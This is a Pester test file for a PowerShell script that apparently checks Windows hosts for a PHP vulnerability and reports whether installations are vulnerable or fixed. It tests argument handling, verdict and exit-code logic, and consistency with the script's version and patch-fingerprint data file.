Describe 'Command line (docs/SPEC.md section 7)' {
    It 'splits a comma-separated -WebRoot' {
        (@(Split-P2SWebRootList @('C:\a,C:\b', ' "C:\c" ', '')) -join '|') | Should -Be 'C:\a|C:\b|C:\c'
    }
    It 'notes a -WebRoot folder that does not exist' {
        Reset-P2SState
        $script:P2S_Opt.WebRoot = @((Join-Path $TestDrive 'no-such-site'))
        $null = @(Get-P2SWebRootList)
        (@($script:P2S_Coverage) -join ' ') | Should -Match 'no-such-site'
    }
    It 'an unknown argument is a usage error (64)' {
        $r = Invoke-P2SMain -UnknownArgs @('-Bogus')
        $r.ExitCode | Should -Be 64
        (@($r.Output) -join ' ') | Should -Match 'unknown argument'
    }
    It 'a bad -Since is a usage error (64)' {
        (Invoke-P2SMain -Since 'not-a-date').ExitCode | Should -Be 64
    }
    It '-Help exits 0' {
        (Invoke-P2SMain -Help).ExitCode | Should -Be 0
    }
    It 'under -File, <Arg> is a usage error (64), not a binding error (1)' -TestCases @(@{ Arg = '-Bogus' }, @{ Arg = 'stray-value' }) {
        param($Arg)
        # The same PowerShell edition, started the way RMM tools and scheduled tasks do.
        $exe = (Get-Process -Id $PID).Path
        & $exe -NoProfile -ExecutionPolicy Bypass -File ([System.IO.Path]::Combine($script:RepoRoot, 'php2shell-check.ps1')) $Arg | Out-Null
        $LASTEXITCODE | Should -Be 64
    }
}

Describe 'Get-P2SSummary (docs/SPEC.md sections 6 and 7)' {
    BeforeAll {
        function New-P2STestInstall {
            param([string]$Verdict, [bool]$Restart = $false)
            return [ordered]@{ verdict = $Verdict; running = [ordered]@{ processes = 1; restart_required = $Restart } }
        }
    }
    It 'no PHP and full coverage is NO_PHP_FOUND / 0' {
        $s = Get-P2SSummary -Installations @() -Findings @() -CoverageLimited $false
        $s.verdict | Should -Be 'NO_PHP_FOUND'
        $s.exit_code | Should -Be 0
    }
    It 'a vulnerable install is VULNERABLE / 1' {
        $s = Get-P2SSummary -Installations @((New-P2STestInstall 'VULNERABLE')) -Findings @() -CoverageLimited $false
        $s.verdict | Should -Be 'VULNERABLE'
        $s.exit_code | Should -Be 1
    }
    It 'a fixed install that needs a restart counts as vulnerable' {
        $s = Get-P2SSummary -Installations @((New-P2STestInstall 'FIXED' $true)) -Findings @() -CoverageLimited $false
        $s.verdict | Should -Be 'VULNERABLE'
        $s.exit_code | Should -Be 1
    }
    It 'limited coverage is INCOMPLETE / 2' {
        $s = Get-P2SSummary -Installations @((New-P2STestInstall 'FIXED')) -Findings @() -CoverageLimited $true
        $s.verdict | Should -Be 'INCOMPLETE'
        $s.exit_code | Should -Be 2
    }
    It 'all fixed is FIXED / 0' {
        (Get-P2SSummary -Installations @((New-P2STestInstall 'FIXED')) -Findings @() -CoverageLimited $false).verdict | Should -Be 'FIXED'
    }
    It 'adds bit 4 for HIGH findings' {
        $f = @([ordered]@{ severity = 'HIGH' }, [ordered]@{ severity = 'REVIEW' })
        $s = Get-P2SSummary -Installations @((New-P2STestInstall 'VULNERABLE'), (New-P2STestInstall 'UNKNOWN')) -Findings $f -CoverageLimited $false
        $s.exit_code | Should -Be 7
        $s.high_findings | Should -Be 1
        $s.review_findings | Should -Be 1
    }
}

Describe 'Embedded data matches data/php2shell.json' {
    BeforeAll {
        $script:Data = Get-Content -LiteralPath ([System.IO.Path]::Combine($script:RepoRoot, 'data', 'php2shell.json')) -Raw | ConvertFrom-Json
    }
    It 'has the same data_version' {
        $script:P2S_DataVersion | Should -Be $script:Data.data_version
    }
    It 'has the same fixed versions for supported branches' {
        $supported = @($script:Data.branches | Where-Object { $_.status -eq 'supported' })
        $supported.Count | Should -Be $script:P2S_FixedVersions.Count
        foreach ($b in $supported) { $script:P2S_FixedVersions[$b.branch] | Should -Be $b.fixed }
    }
    It 'has the same pre-release and development branches' {
        $pre = @($script:Data.branches | Where-Object { $_.status -eq 'prerelease' -or $_.status -eq 'development' } | ForEach-Object { [string]$_.branch })
        $pre.Count | Should -BeGreaterThan 0
        (@($script:P2S_PrereleaseBranches | Sort-Object) -join ',') | Should -Be (@($pre | Sort-Object) -join ',')
    }
    It 'treats every branch status in the data as known' {
        foreach ($b in @($script:Data.branches)) {
            @('supported', 'eol', 'prerelease', 'development') | Should -Contain ([string]$b.status)
        }
    }
    It 'has the same patch fingerprints' {
        $fps = @($script:Data.patch_fingerprints | ForEach-Object { $_.string })
        @($script:P2S_Fingerprints) | Should -Be $fps
    }
}
